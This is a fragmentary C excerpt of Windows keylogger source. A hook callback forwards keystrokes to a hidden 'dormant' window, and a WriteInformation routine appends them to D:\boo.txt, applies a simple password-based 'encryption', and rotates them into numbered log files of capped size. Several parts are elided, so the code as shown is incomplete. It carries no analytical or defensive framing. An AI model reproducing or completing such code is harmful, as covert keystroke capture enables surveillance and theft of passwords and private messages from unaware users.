...
LRESULT CALLBACK MonitorProcedure
...
HWND MakeDormantWindow(HINSTANCE hInstance, 
...
HWND MonitorWnd = NULL;

void WINAPI StartSystem(HINSTANCE hInstance, 
					   HINSTANCE hPrevInstance, 
					   PSTR szCmdLine, int nCmdShow)
{
	MonitorWnd = MakeDormantWindow(hInstance,MonitorProcedure,AppName);
	ShowWindow(MonitorWnd, nCmdShow);
...
(int code, WPARAM wParam, LPARAM lParam)
{
	if(!(lParam >> 31)) SendMessage
	(MonitorWnd,WM_SYSKEYDOWN,(WPARAM)wParam,(LPARAM)lParam);
...
void WriteInformation(char *str)
{
	...
	FILE *foo = fopen("D:\\boo.txt","a");
	if(foo != NULL) { fprintf(foo,"%s",str); fclose(foo); }

	SimpleEncrypt(str,strlen(str),Password);

	// LogCount keeps track of file number
	...
	// synchronize with LogCount with log count file
	...
	// check if file has crossed maximum size (MAX_FSZ)
	fseek(LogFile,0,SEEK_END);
	if( ftell(LogFile) >= MAX_FSZ ) {
		LogCount++;
		CounterFileHandle = fopen(LogCountFileName,"wb");
		if(CounterFileHandle != NULL) {
			fwrite(&LogCount, sizeof(unsigned long int), 1, CounterFileHandle);
			fclose(CounterFileHandle);
		}
